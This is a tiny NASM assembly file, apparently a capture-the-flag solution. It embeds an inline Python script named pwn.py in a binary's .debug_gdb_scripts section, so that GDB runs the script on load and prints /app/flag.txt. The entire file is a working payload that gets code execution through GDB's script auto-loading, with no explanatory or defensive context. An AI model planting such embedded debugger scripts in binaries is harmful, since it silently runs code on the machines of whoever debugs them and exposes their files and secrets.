    BITS 64

    section .debug_gdb_scripts

db 0x04
db `pwn.py\n`
db `print(open("/app/flag.txt").read(), flush=True)\n`
db 0x00